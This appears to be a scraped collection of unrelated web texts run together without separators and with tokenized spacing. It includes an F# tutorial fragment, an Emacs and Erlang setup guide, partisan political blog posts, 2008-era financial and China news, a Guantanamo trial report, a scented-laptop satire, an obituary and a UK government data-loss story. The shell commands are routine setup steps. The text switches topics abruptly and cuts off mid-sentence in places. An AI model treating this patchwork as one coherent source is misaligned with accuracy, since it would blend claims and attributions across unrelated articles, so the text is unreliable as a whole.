let tb3 = new TextBoxInfo ( color = Color .
Purple ,
font = new Font ( FontFamily .
GenericMonospace , 10 .0 f ) )
This syntax makes my code a bit more concise as I do n’t have to input default values , and instead only concentrate on the things I actually need .
Named and optional arguments are features that C# has needed desperately for some time , especially in regards to the COM Interop story .
Wrapping It Up
This is the first in a series on telling the story of object oriented programming in F# .
As programmers , we can decide which language paradigm fits best for the application and the mix of functional , imperative and object oriented programming is essential in today ’s environments .
This series is intended on how you can mix and match the paradigms , but more importantly , make you aware of the choices you have .
Next up on the plate , we ’ll cover interfaces , operators , overloading and so on .
Umm … did I mention that I yearn for hacking Erlang code , too ?
Following Bill Clementson ’s lead , I set up Emacs + Erlang on my Ubuntu hardy box .
Step 1 : Install erlang and erlang - mode
I used the version of erlang and erlang - mode for emacs in Ubuntu ’s repositories .
I might come to regret it some day , but for now the following was just too simple to resist :
$ sudo aptitude install erlang #
The above will install erlang - mode too ; # if it does not just " apt - get install erlang - mode "
Step 2 : Configure erlang - mode in Emacs
I just put the following in my .emacs :
;; Erlang - mode ( require ' erlang - start ) ( add - to - hook ' erlang - mode - hook ( lambda ( ) ;; when starting an Erlang shell in Emacs , the node name ; ; by default should be " emacs " ( setq inferior - erlang - machine - options ' ( " - sname " " emacs " ) ) ;; add Erlang functions to an imenu menu ( imenu - add - to - menubar " imenu " ) ) )
Now I can launch Emacs and open an erlang file , which puts me in Erlang mode .
I can start and Erlang shell with “ C - c C-z ” , compile the Erlang code with “ C - c C-k ” , and view the compilation result in the Erlang buffer ( if the buffer is hidden ) with “ C - c C-l ” .
Or , I can just switch to the Erlang shell with “ C - c C-z ” .
The customizations above enable me to get a menu item in the Emacs menubar with a list of functions defined in the file I am visiting , which is a big help .
I am used to “ ecb- mode ” when coding Python ; ECB does not grok Erlang yet , so the imenu is a handy substitute when coding Erlang .
Step 3 : Install Distel
Distel is to Erlang and erlang - mode what SLIME is to Lisp and lisp - mode .
To get distel :
$ cd ~/.emacs.d/ $ svn co http://distel.googlecode.com/svn/trunk/ distel $ cd distel $ make $ cd doc $ make postscript && make postscript # must run twice $ make info && sudo make install # install the Info documentation $ info distel # read the distel info documentation
Step 4 : Configure Emacs to use Distel
I just need to put this in my .emacs :
( push " /home/parijat/.emacs.d/distel/elisp / " load - path ) ( require ' distel ) ( distel- setup )
Step 5 : Configure Erlang
Distel is designed to work in a distributed Erlang system .
It can connect to specified Erlang nodes .
My strategy is to use the standard erlang - mode command “ C - c C- z ” to start an Erlang shell , and connect to it using Distel by “ C - c C -d n ” .
The latter asks for a nodename , which is going to be “ emacs@beowulf ” ( because beowulf is the short hostname of my laptop ) .
But before we start using remote Erlang nodes , we should create on each physical machine that we will use a ~/.erlang .
cookie file with a password , for inter-Erlang node authentication :
$ echo " secret " > ~/.erlang.cookie $ chmod 0400 ~/.erlang.cookie
Step 6 : Play with Distel
So , now we can launch an Erlang node , either via Emacs using “ C - c C-z ” , or on the command line using “ erl - sname mynode ” .
Then , from within Emacs , we can connect Distel to this node using “ C - c C - d n ” specifiying the nodename on the prompt .

Well , the Bush Regime robbed us blind in many ways .
The destruction of the federal regulatory system has basically given Bush Family allies license to steal -- everything .
We had a chance to stop them after Enron .
But we did n't and now we have a mortgage crisis , an energy crisis and an inflationary cycle that is rapidly derailing the economy .
But that is n't what we 're here to discuss today .
Today we 're here to talk about war profiteers and $ 23 billion missing " in Iraq . "
Before you watch it , I want to point out that the lawyer in the blue shirt is Alan Grayson , the Blue America - endorsed running against Republican rubber stamp Ric Keller in Orlando .
I want to urge you to watch this and if you get the idea to donate to Alan 's campaign after you see it ... here 's the place
There 's a gag order on the BBC investigators and I do n't know if that 's why the video has been removed from the internet .
It can only be viewed in England now .
We found another video , although just the part that has the Alan Grayson parts .
I 'll try to get the full film back .
Meanwhile , this one is worth looking at :

Nolan Bushnell is " thrilled and honored " that Leonardo DiCaprio may be the actor that represents him in the upcoming movie based on his life and the birth of Atari .

In an interview with Multiplayer , Bushnell said that the writers Brian Hecker and Craig Sherman really seemed to get what Atari stood for and that despite the numerous pitches for similar stories , this was the first he 's backed .
" There 's been a lot of books [ about Atari ] , " he said .
" Some correct , some incorrect .
I 've kind of gotten used to being portrayed by others .
I kind of thought that this [ a movie ] might happen .
I kind of thought that it would n't happen until maybe after I was in the ground for a little while .

In an attempt to make the PC even more personal , ASUS has introduced a new line of notebook computers , the F6 series , that feature colorful case artwork combined with matching fragrances .
The computer apparently actively emits the scent while powered up , since ASUS states that “ the lifespan of fragrance depends on actual usage ” .
You can choose from four different visual / olfactory combinations :
Floral Blossom
“ In glorious pink , this design evokes the imagery of a summer party , leaving the somber feel of conventional laptop designs far behind with its cheerful , floral motif and a floral scent – the most attractive laptop for ladies ! ”
Translation : just when you thought you ’d be able to survive the overpowering perfume of the lady beside you on the plane , she hits you with another salvo from her computer .
Musky Black
“ Boasting a glossy black surface emblazoned with a colorful motif inspired by extreme sports and graffiti art , this model emanates power , daring , and energy with its playfulness and musky scent . ”
Musky scent ?
I want a computer I can use — I do n’t want it to smell like it wants to use me .
Morning Dew
“ Realized in a pastel green hue , this graphic motif is inspired by the love and respect for nature .
Return to the embrace of Mother Nature for a crisp and refreshing awakening of the senses whenever you work on your notebook . ”
If you really want to get back to nature , shut the notebook and go take a walk outside .
Aqua Ocean
“ The freedom afforded by a boundless expanse of sky and the energy of breaking waves are captured perfectly on the cover of this notebook .
The matching invigorating aquatic scent will keep your days energized ! ”
I hope it is n’t low tide .
I do n’t want my computer to be an air freshener .
I do n’t want to rub it on my body , blow my nose in it , or mate with it .
And I do n’t want someone else imposing their preferred fragrance on my space .
In my opinion , this idea stinks .
How does it smell to you ?

Of course , people prefer rising stock prices to declining ones .
Would n’t it be wonderful if shares never fell ?
But such actions call into question the claim that ours is a free - market system .
More and more , our version of free markets holds that they are free only when asset values rise .
When they fall , the markets must be managed .
HERE is a question : Might not the routs , which inevitably follow the manias , be less painful if things were not allowed to get wild and crazy on the upside ?
Might not the American people be better off with regulators who curb market enthusiasm  whether in the form of errant lending or voracious , ill - considered deal making  when it reaches manic levels , to protect against the free fall , and the bailouts , that ensue ?
No , no , no  perish the thought , especially when the taxpayer is there to pick up the bill .
Which returns us to the dispiriting divide between those who receive help and those who do n’t .
“ The banks are too big to fail and the man in the street is too small to bail , ” said John C. Bogle , the founder of the Vanguard Group , the mutual funds giant , who is a philosopher of finance .
Mr. Bogle is working on his seventh book , titled “ Enough , ” which is scheduled to be published in November .
He said he was disturbed by the extreme speculation that spread into the entire economy during the housing boom and that now threatens both consumers and investors .
“ I predicted last summer that this would be my 10th bear market , ” he said .
“ But this one is different .
The others were more marketlike , reflecting problems in the market , not problems in the society and the economy as this one does .
As a result , we ’re in for a much more troublesome era than after the other big bear markets . ”
Mr. Bogle , like most investors , is an optimist at heart .
But he believes that we must work to correct the growing imbalances in our country .
“ We Americans are one lucky bunch , ” he said .
“ But , let ’s face the truth .
While the Declaration of Independence assures us that ‘ all men are created equal , ’ we ’d best face the fact that we may be created equal but we are born into a society where inequality of family , of education and , yes , even opportunity begins as soon as we are born . ”
You have to respect a girl who looks like this and shoots high - powered guns .
GUANTANAMO BAY U.S. NAVAL BASE , Cuba ( Reuters ) - Osama bin Laden ’s driver performed vital services that enabled “ the world ’s most dangerous terrorist ” to launch attacks , a prosecutor told jurors before they began deliberations on Monday in the first U.S. war crimes trial at Guantanamo .
A photograph of a sketch by courtroom artist Janet Hamlin , reviewed by the U.S. military , shows defendant Salim Hamdan ( L ) sitting with his defense team during testimony on day three of his trial inside the war crimes courthouse at Camp Justice , at Guantanamo Bay U.S. Naval Base , in Cuba , July 23 , 2008 .
REUTERS / Janet Hamlin / Pool
But defense lawyers for Yemeni captive Salim Hamdan argued he was merely a hired laborer akin to the defense contractors who provide services to U.S. forces .
“ Changing lug nuts and oil filters ” were hardly war crimes , they said ..
Hamdan was not even trusted to know where he was driving bin Laden until after a convoy departed , Lt. Cmdr. Brian Mizer , his U.S. military defense lawyer , told the jury of six U.S. military officers .
Hamdan , who is about 38 , was captured in November 2001 in Afghanistan , where he had worked in bin Laden ’s motor pool since 1996 .
He could face life in prison if convicted of conspiring with al Qaeda and supporting terrorism in the first U.S. war crimes tribunal since World War Two .
Even if he is acquitted , or sentenced to less than the six years he has already spent in captivity , the United States says it still can hold him as an “ unlawful enemy combatant ” until the end of the war on terrorism declared by President George W. Bush after the September 11 attacks .
Hamdan says he drove for bin Laden because he needed the $ 200 monthly wage but denies joining al Qaeda , pledging loyalty to bin Laden or participating in attacks .
Prosecutors portrayed Hamdan as a key conspirator who enthusiastically drove and protected the al Qaeda leader , knowing that bin Laden ’s goals included murdering Americans and taking down Western nations .
“ He ’s an al Qaeda warrior .
He has wounded - and the people he has worked with - have wounded the world , ” prosecutor John Murphy said .
The prosecutor said Hamdan ferried al Qaeda weapons and served as bin Laden ’s bodyguard .
He was assigned to drive him to safety if his convoy came under attack , providing the last line of defense for the man at “ the top of this terror pyramid , ” Murphy said .
“ These terror attacks could not have been carried out without the ability to transport the leadership before , during and after the attacks and allow them to kill on another day , ” he said .
The defense recounted testimony that Hamdan was bored by bin Laden ’s speeches and that when captured at a checkpoint in Afghanistan , he ran and hid in a ditch rather than fire the AK - 47 he carried .
Afterward , Hamdan led U.S. forces on a tour of Kandahar , pointing out al Qaeda safe houses , Mizer said .
He said Hamdan had cooperated with U.S. interrogators , and alluded to secret testimony that journalists were not allowed to hear , apparently referring to an offer Hamdan had made to help U.S. forces in Afghanistan .
“ You know what happened , how we squandered that opportunity , ” Mizer told the jurors .
Mizer also recounted written testimony from accused September 11 mastermind Khalid Sheikh Mohammed , who described his fellow Guantanamo prisoner as a primitive Bedouin only interested in bin Laden ’s money and unfit to plan and execute attacks .
Defense lawyers portrayed the prosecution ’s case as guilt by association and said Hamdan was no more involved in al Qaeda attacks than were bin Laden ’s cooks , farmers and goatherds .
“ Hitler ’s driver was never charged with a war crime and it does n’t work that way today , ” defense lawyer Joseph McMillan said .
Hamdan ’s trial is the first to be conducted by the controversial tribunals the Bush administration create to prosecute non-U.S. citizens outside the civilian and military court system .
An Australian former captive , al Qaeda trainee David Hicks , avoided trial at Guantanamo by pleading guilty to providing material support for terrorism and finished his nine - month sentence in his homeland last year .
At least four of the six military jurors must agree by secret , written ballot in order to return a guilty verdict for Hamdan .

UPDATE : Sorry everybody , no comic today .
I ’ve simply been swamped with work for the past few days .
Look for a return on Friday Saturday .
Thanks !
Am I so out of touch … ?
No , it ’s the children who are wrong .
PLAYBOY : Miss Rand , your novels and essays , especially your controversial best seller , Atlas Shrugged , present a carefully engineered , internally consistent world view .
They are , in effect , the expression of an all - encompassing philosophical system .
What do you seek to accomplish with this new philosophy ?
RAND : I seek to provide men -- or those who care to think -- with an integrated , consistent and rational view of life .
PLAYBOY : What are the basic premises of Objectivism ?
Where does it begin ?
RAND : It begins with the axiom that existence exists , which means that an objective reality exists independent of any perceiver or of the perceiver 's emotions , feelings , wishes , hopes or fears .
Objectivism holds that reason is man 's only means of perceiving reality and his only guide to action .
By reason , I mean the faculty which identifies and integrates the material provided by man 's senses .
PLAYBOY : In Atlas Shrugged your hero , John Galt , declares , " I swear -- by my life and my love of it -- that I will never live for the sake of another man , nor ask another man to live for mine . "
How is this related to your basic principles ?
RAND : Galt 's statement is a dramatized summation of the Objectivist ethics .
Any system of ethics is based on and derived , implicitly or explicitly , from a metaphysics .
The ethic derived from the metaphysical base of Objectivism holds that , since reason is man 's basic tool of survival , rationality is his highest virtue .
To use his mind , to perceive reality and to act accordingly , is man 's moral imperative .
The standard of value of the Objectivist ethics is : man 's life -- man 's survival qua man -- or that which the nature of a rational being requires for his proper survival .
The Objectivist ethics , in essence , hold that man exists for his own sake , that the pursuit of his own happiness is his highest moral purpose , that he must not sacrifice himself to others , nor sacrifice others to himself .
It is this last that Galt 's statement summarizes .
PLAYBOY : What kind of morality derives from this , in terms of the individual 's behavior ?
RAND : This is presented in detail in Atlas Shrugged .
PLAYBOY : The heroine of Atlas Shrugged was , in your words , " completely incapable of experiencing a feeling of fundamental guilt . "
Is any system of morality possible without guilt ?
RAND : The important word in the statement you quoted is " fundamental . "
Fundamental guilt does not mean the ability to judge one 's own actions and regret a wrong action , if one commits it .
Fundamental guilt means that man is evil and guilty by nature .
This step , along with the next step , are the most difficult to teach because there are so many possible starting situations .
Luckily , after these steps it takes very little effort to solve the rest of the cube , so please be patient on steps one and two .
In this step , it is important to remember that the very center piece of each side of the cube does n’t move , making it that side ’s respective color .
You must bring all of the other pieces with that color to that side .
In the example below we bring the red / green piece to match with the red and green sides .
Below are the most common moves for this step .
If your cube does n’t match any of the three starting positions shown below you may need to move some pieces around to get there .
You must do this on four sides in order to make a cross like the “ after ” picture below .
So in the example below , I would first get the red / green block in the correct spot ( as shown in the “ after ” picture ) then do the yellow piece , then blue , then white .
https://www.lewrockwell.com/lrc-blog/anti-constitution-excuses-for-postponing-supreme-court-appointment/
Much of the rhetoric that supports postponing an immediate appointment to the Supreme Court denies the U.S. constitution .
A headline reads “ Sen. Hirono : Dems Will Explore ‘ Every Tool to Keep McConnell from Shoving This Nominee Down Our Throats ’. ”
Does n’t that mean that the constitutional procedures do n’t count or are somehow out of bounds ?
Does n’t her statement mean that shoving down the throat replaces law in her mind ?
Does Hirono have no respect for constitutional procedures ?
Hirono also says she wo n’t meet with Barrett , and she ’s on the Senate Judiciary Committee .
And she ’s joined in this by Sen.
Blumenthal from Connecticut .
He tweets “ I will refuse to treat this process as legitimate & will not meet with Judge Amy Coney Barrett . ”
He calls it an “ illegitimate sham process ” .
Can you dig it ?
Two U.S. senators are claiming that a constitutional process , which this confirmation 100 % is , is a violent fake .
This is what they are conveying to American citizens .
Americans should be dismayed that there are people holding top elective offices who think this way , which is with utter contempt for the constitution they ’re supposed to know something about and uphold .
The case of Obama ’s anti-American statements will be addressed toward the end of this blog .
A leftist coalition has formed to demonstrate against confirmation , and their rhetoric is easily as anti-constitution as that of Hirono and Blumenthal .
They say “ It is unjust and unacceptable to try to rush through a nomination less than 40 days from the election . ”
The U.S. constitution is the supreme law of the land , but they do not accept it as such .
According to them “ we must … let the people decide on the next Supreme Court Justice of this country .
We must demand no nomination before inauguration .
It ’s our future and we should get to choose our justice . ”
This group denies the Constitution altogether .
They want a popular vote for Supreme Court justices .
MoveOn houses a petition with almost 7,000 signatures .
It simply says “ We should not have a defeated President naming a Justice for life in the last few months of his term . ”
( This means in case Trump loses .
That part is n’t the problem . )
The problem with this rhetoric , as in all such instances , is that it proposes an ad hoc standard that ’s supra-constitutional .
One cannot simply make up a condition that negates constitutional law and demand that it be adhered to .
That destroys the constitution altogether .
Here ’s another example , which is a small rally urging delay .
It ’s the rationale that ’s again important .
One articulate person said “ We want to put someone on the Supreme Court for this lifetime appointment that is representative of what we need as people to have equality , to have justice . ”
Obviously , this is n’t how our constitution directs a Supreme Court appointment to be done .
We the people get to talk but the senators get to vote .
If delay or the lack thereof traces back to rules of procedure , and they are constitutional , that ’s how the game is played .
We do not have a system in which justices are selected by “ what we need as people to have equality , to have justice . ”
Obama , our former president , disrespects the U.S. constitution too .
He ’s making up irrelevant conditions for delay like “ [ S ] he [ Justice Ginsburg ] also left instructions for how she wanted her legacy to be honored … ”
Since when does the constitution say that an outgoing justice gets to narrow the field of replacements so as to fit her politics ?
This is an emotional appeal .
Obama then accused the Republicans of seeking unfair advantage .
What ’s unfair about using the power they have ?
Did n’t Obama do that for 8 years ?
And did n’t Obama even try to castrate Trump ’s power unfairly via a soft coup ?
Obama ended his call for delay by making justice arguments similar to those being made by the less august leftist commoners :
“ The questions before the Court now and in the coming years — with decisions that will determine whether or not our economy is fair , our society is just , women are treated equally , our planet survives , and our democracy endures — are too consequential to future generations for courts to be filled through anything less than an unimpeachable process . ”
This is another anti-constitution appeal .
Obama asserts that an appointment now that follows the rules laid down by the constitution is somehow “ impeachable ” , or invalid because the court will be considering weighty issues .
Obviously Obama ’s saying that a Trump appointment will cause an unfair economy , an unjust society , unequal treatment of women , the planet ’s destruction and a fatal blow to “ our democracy ” .
This is all political garbage .
It has nothing to do with the constitutional validity of a Trump appointment being made before he leaves office and before the election .
Obama openly speaks as if the constitution were irrelevant and did n’t matter .
In his mind , what then does matter ?
He has told us clearly .
It ’s his leftist agenda as he and other Democrats in power understand it and see it .
Their ends matter to them , the constitution be damned .
What matters to them are their ideas of a fair economy , just society , equal treatment of women , climate change , and democracy .
They believe in making these things happen , as they understand them , in a never - ending process of legislative “ law - making ” that ’s rubber stamped by the Supreme Court .
They do not believe in rights and fixed laws within which people freely decide their own lives in pursuit of their own happiness .
And above the agenda , which is necessary for them to articulate in order to gain and hold power , they are after their own power .
That is their real aim , their own power .
The left - wing rhetoric of Supreme Court appointment delay reveals how leftists , Democrats included , think .
They think with disrespect and disregard for the constitution .
Obama makes this clear .
This thinking is part of a more general disrespect and disregard of any objective or even semi-objective idea of law and rights that constrains their grasp of any powers whatsoever that they can wield in the name of their leftist agenda .
If traditional America means an America of rights , individualism and rule of law , if it means a land of opportunity and capitalism , however imperfectly realized , the leftists hate America even as it succeeds in achieving these ideals .
Obama leads the parade of anti-American Democrats in wanting to replace it by a socialist America that they rule .

Something is going on in China that simply does not add up .
Let 's start with the GDP .
ChinaView is reporting China think tank forecasts GDP growth at 10.2 % in Q3 .
BEIJING , Aug. 8 ( Xinhua ) -- China will record a GDP growth of 10.2 percent in the third quarter , roughly the same as the second - quarter level , according to a report released on Friday by the State Information Center , a government think tank .
The report said consumption would continue to be a major driving force for the national economy .
However , auto and home purchases ebbed notably in the first half , adversely affecting consumption in the third quarter .

China considering economic stimulus package
China is considering a 370 bln yuan package of fiscal expenditures and tax cuts to stimulate the economy , the Economic Observer reported , citing a source close to the matter .
The report said the plan includes 220 bln yuan in government spending and 150 bln worth of tax cuts .
The plan received initial approval from the Central Leading Group on Economic and Financial Affairs , a body under the State Council , but further details will be finalized by the finance ministry and other government departments .
China May Turn to Bond Sales to Bolster Stocks
Aug. 26 ( Bloomberg ) -- China may let investors sell bonds that can be swapped for shares to deter equity sales and support the stock market , the world 's worst - performing this year .
The China Securities Regulatory Commission is studying exchangeable bonds as part of a package of measures to restrict sales of state - owned shares , said a Beijing - based official of the regulator who declined to be identified before a proposal is made public .
The plan would enable state shareholders to raise funds without selling stock on the market , limiting supply after the benchmark index slumped 55 percent this year .
Lockup restrictions are set to expire on shares accounting for more than half the combined $ 2.29 trillion capitalization of the Shanghai and Shenzhen markets .
The overhang is the legacy of a 2005 government - led shakeup that converted non-tradable shares into common stock that can be bought and sold on exchanges .
Under the commission 's plan , shareholders wanting to sell after lockups expire would have to transfer their stakes to a third party such as a clearing house , according to the official .
They would then be allowed to sell bonds to investors that could be swapped for the shares later .

The Olympic Bust
Buses Ran On Time
At 3 a.m. on most Olympic nights , a bus with a few reporters would return to the Beijing Tibet Hotel .
A dozen security officials met us to make sure we had credentials .
During the day , knee - high tape outside the hotel created lanes for entering and exiting -- a reasonable way to keep things organized .
But in the middle of the night in a sleeping city , the tape was irrelevant .
So , exhausted , we 'd step over the tape and take the direct route to the front door .
And every night the security people objected , insisting forcefully that we obey the stupid tape maze .
Finally , a Chinese solution was devised .
Instead of stopping by the front door , our bus continued to the side of the hotel so , even though our walk was longer , the direct route now obeyed the tape .
Common sense was irrelevant .
The tape -- symbolic of a decision made by somebody somewhere in an unknowably complex and security - conscious control structure -- was all that mattered .
They had uniforms .
We did n't .
That 's big everywhere .
It 's huge here .
All day long , every 20 minutes ( to the split second ) , hundreds of buses run back and forth from media hotels to the Olympic venues .
There 's even a special " Olympic lane " for all official traffic to the Games .
Because the Chinese are obsessed with appearing efficient , the number , size and frequency of buses comically exceed the need .
I often had a bus to myself .
However , I can barely believe what I saw Saturday when , by accident , I had to return to my hotel at 1 p.m. , when almost no reporter has reason to leave the Olympics .
Several football fields full of buses all pulled out simultaneously , headed to hotels all over Beijing , theoretically transporting media .
But I was the only rider on any bus I saw .
They still made their runs .
They still wasted fuel .
They still clogged traffic .
But nobody , in an activity as state - controlled and Communist Party - scrutinized as these Olympics , would deviate from the original plan , no matter how stupid it might be .
Everyone was helpful until you went one inch past where you were supposed to go .
Then , arms sprang out to stop you .
Everywhere you went , even alone at 2 a.m. , you felt completely safe .
Because every hundred feet there were a pair of guards -- at attention in the middle of the night .
The complete lack of dissent here -- not one person could get a permit to use the designated Olympic " protest area , " though some were detained for trying -- has an eloquence of its own .
I 'll leave here more concerned about China 's future , and its impact on those around it , than the future of the United States .
Part of that is probably xenophobia , though I 've spent a lifetime repeating , " Patriotism is the last refuge of a scoundrel . "
Some of it , however , is my suspicion that the cycles of capitalism and the inflexibility of authoritarian regimes make for a spectacularly happy marriage in the virtuous - cycle good times , but perhaps an ugly partnership in the inevitable bad periods .
China got aboard the free - market love train at roughly the time -- in the early 1980s -- that worldwide capitalism hit one of its long secular hot streaks that frequently last 15 to 20 years .
Money could n't wait to invest itself here .
Let 's see how the Party enjoys its first secular bear market .
When political writers wander into sports , they often sound like rubes .
The odds are high that I 've merely flipped that script .
But if China were a stock , based on what I 've seen and felt at this Olympics , I 'd downgrade it from buy to hold .
THE family of a teenager who died after colliding with a lamppost have released a tribute to their " beloved " son .
Robert January , 18 , was rushed to hospital in critical condition after the smash on Friday , but died three days later .
The former Burnham Upper School pupil was driving a red Subaru estate along Long Furlong Drive in Slough at around 11.20 pm when he collided with the lamppost .
Robert and his 16 - year - old passenger were taken to Wexham Park Hospital and the road was shut for several hours while emergency services investigated the scene .
The 16 - year - old was later discharged .
In their statement his family said he was well known and loved in the Burnham area , and urged others to follow in his footsteps and become an organ doner .
The statement said : " He was a regular teenager who enjoyed going out with his mates , clubbing and generally enjoying life .
" Robert loved fishing and was always trying , like all anglers do , to land the big one !
" As his many friends will tell you , he was always very particular in his appearance and designer clothing was an absolute must have . "
It added : " He will be very sadly missed by mum , dad , sister and brother and also his very large family spread around the country .
" At 16 years of age , Robert made a decision to be an organ donor and now four other people have benefited from his decision .
" As a family , we are proud that he chose this course of action and take great comfort that this was his choice to help others even though his loss has devastated us as a family .
" Many thanks to staff in A&E and ITU at Wexham Park Hospital - you guys are absolute legends .
" Finally , to anyone young or old please consider becoming an organ donor as there are always people in need of them as we have found in our own unfortunate circumstances . "
A 16 - year - old youth was arrested on suspicion of being carried in a stolen motor vehicle .
He has been released on police bail pending inquiries .

If DigiTimes ' sources are correct , then Samsung , the world 's primary supplier of flash memory , just told its non-Apple customers to suck it in favor of a " large batch of orders " it received from Cupertino .
The order is said to be for 50 - million " 8 Gb- equivalent " ( we assume they mean gigabyte , or GB ) NAND chips " mainly for use in Apple 's iPhone . "
This order follows a June procurement for 25 million of the same chips .
In response , Samsung has reportedly told its lesser customers that it would " sharply cut supply " of NAND to them while the order is being fulfilled .
The shortage is compounded by Samsung lowering its manufacturing output in April and May in an attempt to reduce oversupply .
Still , if these numbers are true ( they seem high and DigiTimes can be hit or miss with its Apple sources ) then the world is about to be awash in iPhone 3Gs come July 11th . :
We 've given the Gigabits vs. Gigabytes a bit more thought .
If it 's 50 million 8 G bit chips as stated , they would divide evenly across about 2.1 million 8GB iPhone 3Gs plus another 2.1 million 16 GB models .
A reasonable production run for Apple 's global launch but an order which should n't be so taxing on Samsung 's production capability .
Something does n't add up .
While Congressman Dennis Kucinich was reading his Articles of Impeachment address on the floor of the house , I called John Conyers ' D.C. number as VFP ( veterans for Peace ) mail asked , thinking I would get his voice mail , as it was already evening .
To my surprise , Conyers himself answered .
So I just politely told him that I and millions of Americans have come to believe that he is more responsible than Bush or anyone else for all the loss of life in the continuing wars of occupation , because he , Conyers , is blocking the impeachment process , the only hope Americans have to use constitutional law to end the wars , and to prosecute the mass homicidal crimes of the Bush administration acquiesced to by Congress .
Conyers , speaking very slowly and deliberately , repeated each word of the accusation to me ,
" Let me get this straight , you are saying that I am most responsible for the wars and the killing ... " -
I elaborated the point politely but firmly and spoke out as I had originally planned to :
" ... guilty for the continuing killing and suffering more than Bush and Pelosi because they are doing what they are expected to do , but John Conyers is protecting their continuing the wars , by blocking the impeachment process with your powerful Chairmanship of the Judiciary Committee .
So many people go on dying because of John Conyers . "
Conyers again repeated the " guilty " variation word for word and then as if defending himself , said ,
" Are n't you going to let me hear what the man has to say , first ? "
I countered with telling him that it is not a question of what he might consider at this moment but rather weeks and weeks of his blocking the bill of impeachment already filed and fluffing - off the Veterans For Peace trying to speak to him - told him its not just about what he is doing right now but what he has been doing and not doing for a long time now .
" I introduced the bill that made the King national holiday "
Amazed at that proud interjection , I stammered something about that being great , but what about King 's condemnations not being used ?
Conyers words were so carefully enunciated , the words spaced out - I got the impression he was easily handling listening to Kucinich and listening and talking to me at the same time , probably because nothing much of what Kucinich was putting into the Congressional Record that was not already well known by people as informed as the Chairman .
Conyers would listen to me go on about such talk as my having been in the occupation troops in Nazi Germany - that the Germans were indifferent to the foreign lives being taken - that now I am witnessing it here in the States all my life .
Naturally , all time I 'm thinking that I better let him listen to Kucinich and was always expecting him to cut me off and end the call , but he just let me go on , repeating during the fifteen or twenty minute call , at intervals , the admonishment as to why I did n't let him hear what Kucinich was saying , but every time I tried to wrap it up , Conyers would seem to be intent on hearing more or dragging it out .
We talked back and forth , me mostly , as he kept saying , " why do n't you let me listen to the man " ... and I kept saying sure go ahead but Conyers seemed truly taken aback and therefore interested in what I was saying to him as a member of the Veterans For Peace , and he kept me on the line .
At one stage in the conversation , he quizzed me on why so much is directed at him , there being so many others involved besides himself .
I told Conyers how many millions of Americans there were , honest Americans , not capitalists , certainly not communists who realize most of our elected officials are not worth talking to ( I said this is a great line from Dancing With Wolves ) , and that was why we call him , as someone we hope is worth talking to .
He asked for my telephone number in quite a serious tone , and carefully repeated it twice slowly , and said two or three times with emphasis that he would call me .
He got my name wrong and when I corrected him , Conyers said , " I 'm sorry " - .
Putting great intention in his voice , insisted .
He asked me where I was and when I answered New York City , I apologized for not being in his Michigan constituency ,

Wall Street suffered another beating Wednesday at the hands of investors panicking over the state of large banks , as they flocked from stocks and sent safe - haven areas like gold soaring .
Stocks hit a three - year low amid swelling lack of confidence that saw short - sellers beat financials to a pulp , a day before a new " zero tolerance " rule takes effect against naked shorting .
All 30 Dow components lost for the day as did all but 10 on the 100 stocks on the tech - heavy Nasdaq .
The last time the Dowsaw this territory was November 2005 and the S&P 500 has n't been here since May of the same year .
The only thing mitigating further damage was a surge in oil prices , which pushed up Dow components ExxonMobil and Chevron against a flock of losers .
Another investment bank was targeted by sellers , as Morgan Stanley plummeted more than 40 percent to a five - year low .
Also , a steep lack of investor confidence in the American International Group rescue weighed on Wall Street .
" The fear is who is next , " said John O'Brien , senior vice president at MKM Partners LLC in Cleveland .
" It almost feels like people scour the books and say who is the next likely target that we can put a short on and that spreads continuous fear . "
The damage can go beyond the turmoil in the financial services sector and hurt the outlook for corporate profits , O'Brien said .
Panic measures soared on Wall Street , with the Volatility Index hitting levels normally associated with a capitulation bottom .
The market 's woes worsened after Securities and Exchange Commission Chairman Christopher Cox announced the new rules aimed against abusive short - selling across all publicly traded companies .
The rules require the securities involved to be delivered at the close of business on the settlement date .
However , the rule does not take effect until Thursday , giving short - sellers one more day to take their positions against the banks and other stocks .
" You hopefully will see some type of stabilization tomorrow , " said Dennis J. Barba , managing partner of the Oxford Group of Raymond James in Cleveland .
" It 's insanity driving the price of these stocks . "
Biggest Banks Hit Lows
The charge against bank stocks sent Wachovia below $ 10 for the first time since stocks hit their July 15 lows and drove Citigroup to a loss of more than 15 percent , which would be a 10 - year low close for the nation 's biggest bank .
The overall slump reflected a sense that the worst had not passed for the markets and the economy , despite the recent blowout of bad news .
The worries seemed focused especially on liquidity and the refusal overnight of banks to lend .
The negative feeling started in the large financial institutions and swept through the markets .
Morgan Stanley fell on news that officials are weighing whether the firm should remain independent or merge with a bank , given the recent turbulence in the company 's stock , CNBC has learned .
At the same time , news that the Federal Reserve will lend up to $ 85 billionto AIG for two years in exchange for a 79.9 percent equity stake did little to brighten the outlook for the financial sector .
The move brings the total tab for U.S. government rescues to more than $ 900 billion .
The information was contained on a memory stick A contractor working for the Home Office has lost a computer memory stick containing personal details about tens of thousands of criminals .
The Home Office was first told by private firm PA Consulting on Monday that the data might be missing .
The lost data includes details about 10,000 prolific offenders as well as information on all 84,000 prisoners in England and Wales .
The Home Office said a full investigation was being conducted .
They said the police and the Information Commissioner had been informed .
Searching questions must be answered about what safeguards were in place
David Smith , Information Commissioner 's Office
The loss is the latest in a string of lost data incidents for the government , including stolen laptops , lost computer discs and memory sticks and files left on trains .
Earlier this month the BBC apologised after a memory stick containing the personal details of hundreds of children who had applied to take part in a TV show was stolen from a vehicle .
On Tuesday a BBC analysis found sensitive data potentially affecting more than four million people had been lost by government departments in the year to April .
Cases included the loss of the National Insurance numbers of 17,000 people and the theft of a laptop with encrypted details of 17,000 Sats markers .
The details of 25 million child benefit claimants vanished last year .
Please turn on JavaScript .
Media requires JavaScript to play .
The incident led to the recommendation that government departments should give details of personal data losses .
In this latest case , the contractor confirmed to the Home Office on Tuesday it had failed to uncover the memory stick , but it was not clear how it came to be lost .
The data on the stick also includes information from the Police National Computer of some 30,000 people with six or more convictions in the last year .
Details of serving prisoners included names , addresses , dates of birth and in come cases release dates , said BBC political correspondent Laura Kuenssberg .
The transfer of further data to PA Consulting on the project has been suspended pending the investigation .
' Toxic liability ' David Smith , Deputy Commissioner in the Information Commissioner 's Office , said the latest loss showed that personal information could be a " toxic liability " if not handled properly .
" It is deeply worrying that after a number of major data losses and the publication of two government reports on high profile breaches of the Data Protection Act , more personal information has been reported lost , " he said .
He added that data protection needed to be taken seriously at all levels and sensitive information , such as prisoner records , held securely at all times .
